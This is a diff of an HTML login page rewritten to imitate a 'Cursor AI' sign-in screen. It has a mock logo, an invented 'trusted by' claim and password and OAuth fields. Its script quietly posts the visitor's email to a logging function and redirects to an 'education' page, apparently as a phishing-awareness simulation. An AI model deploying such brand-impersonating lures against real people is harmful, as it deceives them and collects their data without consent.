@@ -1,421 +1,245 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sign in</title>
-  <style>
-@layer branding {
-                
-
-.radix-themes {
-  --cursor-button: pointer;
-  --cursor-disabled: default;
-  --cursor-link: pointer;
-  --cursor-menu-item: pointer;
-  --cursor-slider-thumb: pointer;
-  --cursor-slider-thumb-active: pointer;
-  --cursor-switch: pointer;
-
-  --custom-font-family: "";
-  --system-font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI (Custom)', Roboto, 'Helvetica Neue', 'Open Sans (Custom)', system-ui, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji';
-  --default-font-family: var(--custom-font-family, Inter), var(--system-font-family);
-  --heading-font-family: var(--custom-font-family, InterDisplay), var(--system-font-family);
-  --font-weight-bold: 600;
-
-  --code-padding-top: 0em;
-  --code-padding-bottom: 0.075em;
-  --code-font-family: 'IBM Plex Mono', 'Menlo', monospace, 'Apple Color Emoji',
-    'Segoe UI Emoji';
-
-  --marker-font-size-adjust: 0.97222;
-  --marker-font-weight: 500;
-
-  font-feature-settings: 'liga' 1, 'calt' 1;
-}
-
-@supports (font-variation-settings: normal) {
-  .radix-themes {
-    --default-font-family: var(--custom-font-family, var(--inter-variable-font, InterVariable)), var(--system-font-family);
-    --heading-font-family: var(--custom-font-family, var(--inter-variable-font, InterVariable)), var(--system-font-family);
-  }
-}
-
-
-:root, .light, .light-theme {
-  --branded-link-color: #5753C6;
-  --branded-link-text-decoration-color: #5753c666;
-  --branded-button-color: #FFFFFF;
-  --branded-button-background: #000000;
-  --branded-button-hover-background: #2e2e2e;
-  --branded-button-active-background: #414141;
-  --branded-button-box-shadow-color: transparent;
-  --branded-page-background: #FCFCFC;
-}
-
-.dark, .dark-theme {
-  --branded-link-color: #B1A9FF;
-  --branded-link-text-decoration-color: #b1a9ff66;
-  --branded-button-color: #000000;
-  --branded-button-background: #FFFFFF;
-  --branded-button-hover-background: #f6f6f6;
-  --branded-button-active-background: #ededed;
-  --branded-button-box-shadow-color: transparent;
-  --branded-page-background: #000000;
-}
-
-.radix-themes:not(.dark, .dark-theme), .radix-themes:is(.light, .light-theme) {
-  --accent-1: #fcfcfc;
-  --accent-2: #f9f9f9;
-  --accent-3: #f0f0f0;
-  --accent-4: #e8e8e8;
-  --accent-5: #e0e0e0;
-  --accent-6: #d9d9d9;
-  --accent-7: #cecece;
-  --accent-8: #bbb;
-  --accent-9: #000;
-  --accent-10: #2e2e2e;
-  --accent-11: #646464;
-  --accent-12: #202020;
-
-  --accent-a1: #00000003;
-  --accent-a2: #00000006;
-  --accent-a3: #0000000f;
-  --accent-a4: #00000017;
-  --accent-a5: #0000001f;
-  --accent-a6: #00000026;
-  --accent-a7: #00000031;
-  --accent-a8: #00000044;
-  --accent-a9: #000000;
-  --accent-a10: #000000d1;
-  --accent-a11: #0000009b;
-  --accent-a12: #000000df;
-
-  --gray-1: #fcfcfc;
-  --gray-2: #f9f9f9;
-  --gray-3: #f0f0f0;
-  --gray-4: #e8e8e8;
-  --gray-5: #e0e0e0;
-  --gray-6: #d9d9d9;
-  --gray-7: #cecece;
-  --gray-8: #bbb;
-  --gray-9: #8d8d8d;
-  --gray-10: #838383;
-  --gray-11: #646464;
-  --gray-12: #202020;
-
-  --gray-a1: #00000003;
-  --gray-a2: #00000006;
-  --gray-a3: #0000000f;
-  --gray-a4: #00000017;
-  --gray-a5: #0000001f;
-  --gray-a6: #00000026;
-  --gray-a7: #00000031;
-  --gray-a8: #00000044;
-  --gray-a9: #00000072;
-  --gray-a10: #0000007c;
-  --gray-a11: #0000009b;
-  --gray-a12: #000000df;
-
-  --accent-track: var(--accent-9);
-  --accent-indicator: var(--accent-9);
-  --accent-contrast: #fff;
-  --gray-surface: #ffffffcc;
-}
-
-.radix-themes:not(.dark, .dark-theme), .radix-themes:is(.light, .light-theme), :where(.radix-themes:not(.dark, .dark-theme), .radix-themes:is(.light, .light-theme)) [data-accent-color] {
-  --focus-1: #fdfdff;
-  --focus-2: #f7f8ff;
-  --focus-3: #eff1fe;
-  --focus-4: #e4e8ff;
-  --focus-5: #d8ddff;
-  --focus-6: #c8ceff;
-  --focus-7: #b5bbf9;
-  --focus-8: #999ff0;
-  --focus-9: #5e5ad5;
-  --focus-10: #564fcc;
-  --focus-11: #5753c6;
-  --focus-12: #292862;
-
-  --focus-a1: #0000ff02;
-  --focus-a2: #0020ff08;
-  --focus-a3: #0020f010;
-  --focus-a4: #0026ff1b;
-  --focus-a5: #0021ff27;
-  --focus-a6: #001cff37;
-  --focus-a7: #0115eb4a;
-  --focus-a8: #000fda66;
-  --focus-a9: #0600bea5;
-  --focus-a10: #0a00b5b0;
-  --focus-a11: #0600abac;
-  --focus-a12: #010045d7;
-}
-
-@supports (color: color(display-p3 1 1 1)) {
-  @media (color-gamut: p3) {
-    .radix-themes:not(.dark, .dark-theme),
-    .radix-themes:is(.light, .light-theme) {
-      --accent-a1: color(display-p3 0 0 0 / 0.0118);
-      --accent-a2: color(display-p3 0 0 0 / 0.0235);
-      --accent-a3: color(display-p3 0 0 0 / 0.0588);
-      --accent-a4: color(display-p3 0 0 0 / 0.0902);
-      --accent-a5: color(display-p3 0 0 0 / 0.1216);
-      --accent-a6: color(display-p3 0 0 0 / 0.149);
-      --accent-a7: color(display-p3 0 0 0 / 0.1922);
-      --accent-a8: color(display-p3 0 0 0 / 0.2667);
-      --accent-a9: color(display-p3 0 0 0);
-      --accent-a10: color(display-p3 0 0 0 / 0.8196);
-      --accent-a11: color(display-p3 0 0 0 / 0.6078);
-      --accent-a12: color(display-p3 0 0 0 / 0.8745);
-
-      --gray-a1: color(display-p3 0 0 0 / 0.0118);
-      --gray-a2: color(display-p3 0 0 0 / 0.0235);
-      --gray-a3: color(display-p3 0 0 0 / 0.0588);
-      --gray-a4: color(display-p3 0 0 0 / 0.0902);
-      --gray-a5: color(display-p3 0 0 0 / 0.1216);
-      --gray-a6: color(display-p3 0 0 0 / 0.149);
-      --gray-a7: color(display-p3 0 0 0 / 0.1922);
-      --gray-a8: color(display-p3 0 0 0 / 0.2667);
-      --gray-a9: color(display-p3 0 0 0 / 0.4471);
-      --gray-a10: color(display-p3 0 0 0 / 0.4863);
-      --gray-a11: color(display-p3 0 0 0 / 0.6078);
-      --gray-a12: color(display-p3 0 0 0 / 0.8745);
-    }
-
-    .radix-themes:not(.dark, .dark-theme), .radix-themes:is(.light, .light-theme), :where(.radix-themes:not(.dark, .dark-theme), .radix-themes:is(.light, .light-theme)) [data-accent-color] {
-      --focus-a1: color(display-p3 0.0196 0.0196 1 / 0.008);
-      --focus-a2: color(display-p3 0.0196 0.1451 0.8784 / 0.032);
-      --focus-a3: color(display-p3 0.0078 0.1294 0.8784 / 0.063);
-      --focus-a4: color(display-p3 0.0039 0.1176 0.9255 / 0.102);
-      --focus-a5: color(display-p3 0.0078 0.1137 0.9216 / 0.15);
-      --focus-a6: color(display-p3 0.0039 0.0941 0.9294 / 0.212);
-      --focus-a7: color(display-p3 0.0039 0.0745 0.851 / 0.287);
-      --focus-a8: color(display-p3 0.0039 0.051 0.7922 / 0.397);
-      --focus-a9: color(display-p3 0.0196 0 0.702 / 0.648);
-      --focus-a10: color(display-p3 0.0353 0 0.6706 / 0.691);
-      --focus-a11: color(display-p3 0.0196 0 0.6275 / 0.675);
-      --focus-a12: color(display-p3 0.0039 0 0.251 / 0.844);
-    }
-  }
-}
-
-:is(.dark, .dark-theme) .radix-themes:not(.light, .light-theme) {
-  --accent-1: #111;
-  --accent-2: #191919;
-  --accent-3: #232323;
-  --accent-4: #2a2a2a;
-  --accent-5: #313131;
-  --accent-6: #3a3a3a;
-  --accent-7: #484848;
-  --accent-8: #616161;
-  --accent-9: #fff;
-  --accent-10: #f6f6f6;
-  --accent-11: #b4b4b4;
-  --accent-12: #eee;
-
-  --accent-a1: #ffffff11;
-  --accent-a2: #ffffff19;
-  --accent-a3: #ffffff23;
-  --accent-a4: #ffffff2a;
-  --accent-a5: #ffffff31;
-  --accent-a6: #ffffff3a;
-  --accent-a7: #ffffff48;
-  --accent-a8: #ffffff61;
-  --accent-a9: #ffffff;
-  --accent-a10: #fffffff6;
-  --accent-a11: #ffffffb4;
-  --accent-a12: #ffffffee;
-
-  --gray-1: #000;
-  --gray-2: #191919;
-  --gray-3: #191919;
-  --gray-4: #191919;
-  --gray-5: #1e1e1e;
-  --gray-6: #242424;
-  --gray-7: #2e2e2e;
-  --gray-8: #3f3f3f;
-  --gray-9: #494949;
-  --gray-10: #5d5d5d;
-  --gray-11: #9e9e9e;
-  --gray-12: #eee;
-
-  --gray-a1: #00000000;
-  --gray-a2: #ffffff19;
-  --gray-a3: #ffffff19;
-  --gray-a4: #ffffff19;
-  --gray-a5: #ffffff1e;
-  --gray-a6: #ffffff24;
-  --gray-a7: #ffffff2e;
-  --gray-a8: #ffffff3f;
-  --gray-a9: #ffffff49;
-  --gray-a10: #ffffff5d;
-  --gray-a11: #ffffff9e;
-  --gray-a12: #ffffffee;
-
-  --accent-track: var(--accent-9);
-  --accent-indicator: var(--accent-9);
-  --accent-contrast: #000;
-  --gray-surface: rgba(0, 0, 0, 0.05);
-}
-
-.radix-themes:is(.dark, .dark-theme), :is(.dark, .dark-theme) .radix-themes:not(.light, .light-theme), :where(.radix-themes:is(.dark, .dark-theme), :is(.dark, .dark-theme) .radix-themes:not(.light, .light-theme)) [data-accent-color] {
-  --focus-1: #14131e;
-  --focus-2: #171625;
-  --focus-3: #262047;
-  --focus-4: #312662;
-  --focus-5: #3b2f71;
-  --focus-6: #463b80;
-  --focus-7: #524793;
-  --focus-8: #6255ae;
-  --focus-9: #6d55d2;
-  --focus-10: #7966db;
-  --focus-11: #b1a9ff;
-  --focus-12: #e0dffe;
-
-  --focus-a1: #aaa2ff1e;
-  --focus-a2: #9f98ff25;
-  --focus-a3: #8973ff47;
-  --focus-a4: #8063ff62;
-  --focus-a5: #866bff71;
-  --focus-a6: #8c76ff80;
-  --focus-a7: #8f7cff93;
-  --focus-a8: #907dffae;
-  --focus-a9: #8467ffd2;
-  --focus-a10: #8d77ffdb;
-  --focus-a11: #b1a9ff;
-  --focus-a12: #e1e0fffe;
-}
-
-@supports (color: color(display-p3 1 1 1)) {
-  @media (color-gamut: p3) {
-    :is(.dark, .dark-theme) .radix-themes:not(.light, .light-theme) {
-      --accent-a1: color(display-p3 1 1 1 / 0.0667);
-      --accent-a2: color(display-p3 1 1 1 / 0.098);
-      --accent-a3: color(display-p3 1 1 1 / 0.1373);
-      --accent-a4: color(display-p3 1 1 1 / 0.1647);
-      --accent-a5: color(display-p3 1 1 1 / 0.1922);
-      --accent-a6: color(display-p3 1 1 1 / 0.2275);
-      --accent-a7: color(display-p3 1 1 1 / 0.2824);
-      --accent-a8: color(display-p3 1 1 1 / 0.3804);
-      --accent-a9: color(display-p3 1 1 1);
-      --accent-a10: color(display-p3 1 1 1 / 0.9647);
-      --accent-a11: color(display-p3 1 1 1 / 0.7059);
-      --accent-a12: color(display-p3 1 1 1 / 0.9333);
-
-      --gray-a1: color(display-p3 0 0 0 / 0);
-      --gray-a2: color(display-p3 1 1 1 / 0.098);
-      --gray-a3: color(display-p3 1 1 1 / 0.098);
-      --gray-a4: color(display-p3 1 1 1 / 0.098);
-      --gray-a5: color(display-p3 1 1 1 / 0.1176);
-      --gray-a6: color(display-p3 1 1 1 / 0.1412);
-      --gray-a7: color(display-p3 1 1 1 / 0.1804);
-      --gray-a8: color(display-p3 1 1 1 / 0.2471);
-      --gray-a9: color(display-p3 1 1 1 / 0.2863);
-      --gray-a10: color(display-p3 1 1 1 / 0.3647);
-      --gray-a11: color(display-p3 1 1 1 / 0.6196);
-      --gray-a12: color(display-p3 1 1 1 / 0.9333);
-    }
-
-    .radix-themes:is(.dark, .dark-theme), :is(.dark, .dark-theme) .radix-themes:not(.light, .light-theme), :where(.radix-themes:is(.dark, .dark-theme), :is(.dark, .dark-theme) .radix-themes:not(.light, .light-theme)) [data-accent-color] {
-      --focus-a1: color(display-p3 0.6902 0.6549 1 / 0.114);
-      --focus-a2: color(display-p3 0.6353 0.6078 0.9961 / 0.142);
-      --focus-a3: color(display-p3 0.5373 0.4667 1 / 0.271);
-      --focus-a4: color(display-p3 0.502 0.4039 1 / 0.369);
-      --focus-a5: color(display-p3 0.5255 0.4314 1 / 0.428);
-      --focus-a6: color(display-p3 0.549 0.4784 1 / 0.487);
-      --focus-a7: color(display-p3 0.5647 0.502 1 / 0.557);
-      --focus-a8: color(display-p3 0.5725 0.5059 1 / 0.659);
-      --focus-a9: color(display-p3 0.5176 0.4235 1 / 0.797);
-      --focus-a10: color(display-p3 0.5569 0.4863 1 / 0.832);
-      --focus-a11: color(display-p3 0.7059 0.6784 1 / 0.977);
-      --focus-a12: color(display-p3 0.8902 0.8863 1 / 0.985);
-    }
-  }
-}
-
-                .radix-themes {
-                  --color-background: var(--branded-page-background);
-                }
-                :root body {
-                  margin: 0;
-                  background-color: var(--branded-page-background);
-                }
-              }
-            </style><style>@layer custom-elements {
-  .ak-Background {
-    background-color: var(--branded-page-background);
-  }
-  
-}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cursor AI - Sign In</title>
+    <style>
+        :root {
+            --bg-dark: #0d1117;
+            --card-bg: #161b22;
+            --text-light: #f0f6fc;
+            --accent-blue: #58a6ff;
+            --input-bg: #0d1117;
+        }
+        
+        body {
+            background-color: var(--bg-dark);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: var(--text-light);
+        }
+        
+        .login-card {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            padding: 32px;
+            width: 320px;
+            box-shadow: 0 8px 24px rgba(1, 4, 9, 0.5);
+            border: 1px solid #30363d;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .logo svg {
+            width: 120px;
+            height: 40px;
+        }
+        
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--input-bg);
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            color: var(--text-light);
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 3px rgba(56, 139, 253, 0.3);
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--accent-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        button:hover {
+            background-color: #388bfd;
+        }
+        
+        .divider {
+            position: relative;
+            text-align: center;
+            margin: 24px 0;
+            color: #8b949e;
+        }
+        
+        .divider::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background-color: #30363d;
+            z-index: 1;
+        }
+        
+        .divider span {
+            position: relative;
+            display: inline-block;
+            padding: 0 12px;
+            background-color: var(--card-bg);
+            z-index: 2;
+        }
+        
+        .oauth-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 12px;
+            background-color: transparent;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            color: var(--text-light);
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .oauth-btn:hover {
+            background-color: rgba(240, 246, 252, 0.1);
+        }
+        
+        .oauth-btn svg {
+            margin-right: 8px;
+            width: 18px;
+            height: 18px;
+        }
+        
+        .footer-links {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #8b949e;
+        }
+        
+        .footer-links a {
+            color: var(--accent-blue);
+            text-decoration: none;
+        }
+        
+        .trusted-by {
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 12px;
+            color: #8b949e;
+        }
+    </style>
 </head>
 <body>
-  <div class="rt-Grid rt-r-gtc rt-r-gtr rt-r-ai-center rt-r-jc-center rt-r-p-4 rt-r-min-w rt-r-min-h ak-Background">
-    <div class="rt-Flex rt-r-fd-column rt-r-gap-5 rt-r-pt-4 rt-r-pb-9 ak-Content">
-      <div class="rt-Flex rt-r-fd-column rt-r-ai-center rt-r-jc-center rt-r-gap-4 ak-Header">
-        <!-- 原始Logo占位符 -->
-        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M12 2L2 7L12 12L22 7L12 2Z" fill="#5753C6"/>
-          <path d="M2 17L12 22L22 17" stroke="#5753C6" stroke-width="2"/>
-          <path d="M2 12L12 17L22 12" stroke="#5753C6" stroke-width="2"/>
-        </svg>
-        <h1 class="rt-Heading rt-r-size-6 rt-r-ta-center rt-r-tw-balance ak-Heading">Sign in</h1>
-      </div>
-      
-      <div class="rt-reset rt-BaseCard rt-Card rt-r-size-4 xs:rt-r-size-5 rt-variant-surface ak-Card">
-        <form id="loginForm">
-          <div class="rt-Flex rt-r-fd-column rt-r-gap-5">
-            <div class="rt-Flex rt-r-fd-column rt-r-gap-5 ak-AuthForm">
-              <div class="rt-Flex rt-r-fd-column rt-r-gap-2">
-                <div class="rt-Flex">
-                  <label for="email" class="rt-Text rt-r-size-2 rt-r-weight-bold rt-r-lt-start ak-Label">Email</label>
-                </div>
-                <div class="rt-TextFieldRoot rt-r-size-3 rt-variant-surface ak-TextField">
-                  <input type="email" id="email" required class="rt-reset rt-TextFieldInput" placeholder="your.email@company.com">
-                </div>
-              </div>
-              <button type="submit" class="rt-reset rt-BaseButton rt-Button BrandedButton ak-PrimaryButton rt-r-size-3">
-                Continue
-              </button>
+    <div class="login-card">
+        <div class="logo">
+            <!-- Cursor AI Logo SVG -->
+            <svg viewBox="0 0 120 40" xmlns="http://www.w3.org/2000/svg">
+                <path d="M30 10L40 30L50 10L60 30L70 10" stroke="#58a6ff" stroke-width="4" fill="none"/>
+                <path d="M80 10V30H90V20H95V30H100V10H90V17.5H85V10H80Z" fill="#58a6ff"/>
+                <text x="105" y="25" font-family="Arial" font-size="20" fill="#f0f6fc">AI</text>
+            </svg>
+        </div>
+        
+        <div class="trusted-by">
+            Trusted by developers at Google, Microsoft, OpenAI, and more
+        </div>
+        
+        <h1>Sign in to Cursor AI</h1>
+        
+        <form id="login-form">
+            <div class="form-group">
+                <label for="email">Email address</label>
+                <input type="email" id="email" name="email" placeholder="your.email@company.com" required autofocus>
             </div>
             
-            <div data-accent-color="gray" class="rt-Text rt-r-size-1 ak-TextSeparator">OR</div>
-            
-            <div class="rt-Flex rt-r-fd-column rt-r-gap-3 ak-AuthMethodsProviders">
-              <button type="button" class="rt-reset rt-BaseButton rt-r-size-3 rt-variant-surface rt-high-contrast rt-Button ak-AuthButton">
-                <svg fill="none" height="15" viewBox="0 0 16 16" width="15" xmlns="http://www.w3.org/2000/svg" class="ak-AuthButtonIcon">
-                  <g>
-                    <path d="M15.83 8.18C15.83 7.65333 15.7833 7.15333 15.7033 6.66667H8.17V9.67333H12.4833C12.29 10.66 11.7233 11.4933 10.8833 12.06V14.06H13.4567C14.9633 12.6667 15.83 10.6133 15.83 8.18Z" fill="#4285F4"></path>
-                    <path d="M8.17 16C10.33 16 12.1367 15.28 13.4567 14.06L10.8833 12.06C10.1633 12.54 9.25 12.8333 8.17 12.8333C6.08334 12.8333 4.31667 11.4267 3.68334 9.52667H1.03V11.5867C2.34334 14.2 5.04334 16 8.17 16Z" fill="#34A853"></path>
-                    <path d="M3.68334 9.52667C3.51667 9.04667 3.43 8.53333 3.43 8C3.43 7.46667 3.52334 6.95334 3.68334 6.47334V4.41334H1.03C0.483335 5.49334 0.170002 6.70667 0.170002 8C0.170002 9.29333 0.483335 10.5067 1.03 11.5867L3.68334 9.52667Z" fill="#FBBC05"></path>
-                    <path d="M8.17 3.16667C9.35 3.16667 10.4033 3.57334 11.2367 4.36667L13.5167 2.08667C12.1367 0.793334 10.33 0 8.17 0C5.04334 0 2.34334 1.8 1.03 4.41334L3.68334 6.47334C4.31667 4.57334 6.08334 3.16667 8.17 3.16667Z" fill="#EA4335"></path>
-                  </g>
-                </svg>
-                <span class="rt-Text rt-r-size-2 xs:rt-r-size-3 ak-AuthButtonLabel">Continue with Google</span>
-              </button>
-              
-              <button type="button" class="rt-reset rt-BaseButton rt-r-size-3 rt-variant-surface rt-high-contrast rt-Button ak-AuthButton">
-                <svg fill="none" height="16" viewBox="0 0 15 15" width="16" xmlns="http://www.w3.org/2000/svg" class="ak-AuthButtonIcon">
-                  <path clip-rule="evenodd" d="M7.49933 0.25C3.49635 0.25 0.25 3.49593 0.25 7.50024C0.25 10.703 2.32715 13.4206 5.2081 14.3797C5.57084 14.446 5.70302 14.2222 5.70302 14.0299C5.70302 13.8576 5.69679 13.4019 5.69323 12.797C3.67661 13.235 3.25112 11.825 3.25112 11.825C2.92132 10.9874 2.44599 10.7644 2.44599 10.7644C1.78773 10.3149 2.49584 10.3238 2.49584 10.3238C3.22353 10.375 3.60629 11.0711 3.60629 11.0711C4.25298 12.1788 5.30335 11.8588 5.71638 11.6732C5.78225 11.205 5.96962 10.8854 6.17658 10.7043C4.56675 10.5209 2.87415 9.89918 2.87415 7.12104C2.87415 6.32925 3.15677 5.68257 3.62053 5.17563C3.54576 4.99226 3.29697 4.25521 3.69174 3.25691C3.69174 3.25691 4.30015 3.06196 5.68522 3.99973C6.26337 3.83906 6.8838 3.75895 7.50022 3.75583C8.1162 3.75895 8.73619 3.83906 9.31523 3.99973C10.6994 3.06196 11.3069 3.25691 11.3069 3.25691C11.7026 4.25521 11.4538 4.99226 11.3795 5.17563C11.8441 5.68257 12.1245 6.32925 12.1245 7.12104C12.1245 9.9063 10.4292 10.5192 8.81452 10.6985C9.07444 10.9224 9.30633 11.3648 9.30633 12.0413C9.30633 13.0102 9.29742 13.7922 9.29742 14.0299C9.29742 14.2239 9.42828 14.4496 9.79591 14.3788C12.6746 13.4179 14.75 10.7025 14.75 7.50024C14.75 3.49593 11.5036 0.25 7.49933 0.25Z" fill="currentColor" fill-rule="evenodd"></path>
-                </svg>
-                <span class="rt-Text rt-r-size-2 xs:rt-r-size-3 ak-AuthButtonLabel">Continue with GitHub</span>
-              </button>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="••••••••" required>
             </div>
-          </div>
+            
+            <button type="submit">Continue</button>
         </form>
-      </div>
+        
+        <div class="divider">
+            <span>OR</span>
+        </div>
+        
+        <button class="oauth-btn">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M12.48 10.92v3.28h7.84c-.24 1.84-.853 3.187-1.787 4.133-1.147 1.147-2.933 2.4-6.053 2.4-4.827 0-8.6-3.893-8.6-8.72s3.773-8.72 8.6-8.72c2.6 0 4.507 1.027 5.907 2.347l2.307-2.307C18.747 1.44 16.133 0 12.48 0 5.867 0 .307 5.387.307 12s5.56 12 12.173 12c3.573 0 6.267-1.173 8.373-3.36 2.16-2.16 2.84-5.213 2.84-7.667 0-.76-.053-1.467-.173-2.053H12.48z" fill="#4285F4"/>
+            </svg>
+            Continue with Google
+        </button>
+        
+        <button class="oauth-btn">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M12 0C5.374 0 0 5.373 0 12c0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z" fill="#f0f6fc"/>
+            </svg>
+            Continue with GitHub
+        </button>
+        
+        <div class="footer-links">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+            <p><a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></p>
+        </div>
     </div>
-    
-    <small data-accent-color="gray" style="--max-width:320px;--ml:auto;--mr:auto;grid-row-start:3;--line-height:20px;place-self:end" class="rt-Text rt-r-size-2 rt-r-ta-center rt-Box rt-r-max-w rt-r-mx ak-Footer">
-      Don't have an account? <a href="#" class="rt-Text BrandedLink rt-reset">Sign up</a>
-    </small>
-  </div>
 
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      window.location.href = 'education.html';
-    });
-  </script>
+    <script>
+        document.getElementById('login-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            
+            // 仅发送邮箱到后端记录
+            try {
+                await fetch('/.netlify/functions/log-email', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email })
+                });
+            } catch (error) {
+                console.error('Logging failed:', error);
+            }
+            
+            // 立即跳转教育页面
+            window.location.href = '/education.html';
+        });
+    </script>
 </body>
 </html>
